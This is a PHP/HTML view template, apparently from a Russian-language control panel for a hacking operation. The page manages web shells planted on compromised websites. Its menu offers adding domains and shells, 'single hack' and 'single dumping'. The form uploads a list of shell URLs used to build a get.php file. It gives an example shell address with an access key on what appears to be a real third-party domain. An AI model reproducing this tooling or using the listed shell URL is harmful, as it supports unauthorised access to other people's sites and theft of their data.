	<!-- START CONTENT -->
	<div id="content">
		<ul class="page-nav fl">
			<li ><?=$html->link('Состояние',array('action'=>'mailinfo')); ?></li>
			<li ><?=$html->link('Добавить ссылки',array('action'=>'add')); ?></li>
			<li ><?=$html->link('Добавить домены',array('action'=>'add_domens')); ?></li>
			<li class="active"><?=$html->link('Добавить шеллы',array('action'=>'add_shells')); ?></li>
			<li ><?=$html->link('Одиночный взлом',array('action'=>'add_one')); ?></li>
			<li><?=$html->link('Одиночный дампинг',array('action'=>'dumping_all')); ?></li>
			
		</ul>
		<div class="clear"></div>
	
		<table class="table">
			<thead>
				<th>Добавление шелов</th>
			</thead>
			<tbody>
				<tr>
					<td>
						<label for="hash">Укажите путь к файлу в котором содержаться линки с загруженными на шеллы файлами для сборки get.php:</label><br>
						Файлик для сборки <a href="/get.txt">скачать</a>
						<br>
						
						<br><br>
						Шеллы перезаписываются !!!Поэтому берите старые еще если нужны <a href="/shelllist.txt">shelllist.txt</a> и вставляйте в ваш файлик 
						<br>
						<br><br>
						
						
						
						Формат линков добавляемых в систему любой:
						<br><span style="color:red">dgpacific.com/62acm.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG</span>
						<br> <span style="color:red">site.ru/get.php </span>
						<br><span style="color:red">http://site.ru/get.php </span>
						
						<br><br>
						один url на одной строке в файле
						
						
						
						
						
						<?=$form->create('Post',array('type'=>'file'))?>
						<?=$form->input('file',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
						<?  $options = array('1' => 'перезаписать', '2' => 'дописать');?>
						
						
						<?=$form->select('type', $options, array('default' => '1'));?>
						
						

			
						
						<?=$form->submit('Добавить', array('name'=>'hash','class'=>'btn btn_green','div'=>false))?>
						<?=$form->end()?>
						<br/>
						<span class="comment red">Допустимый формат файлов .txt в кодировке UTF-8</span>
					</td>
				</tr>
			</tbody>
		</table>

	</div>
	<!-- STOP CONTENT -->
		
		
		
		

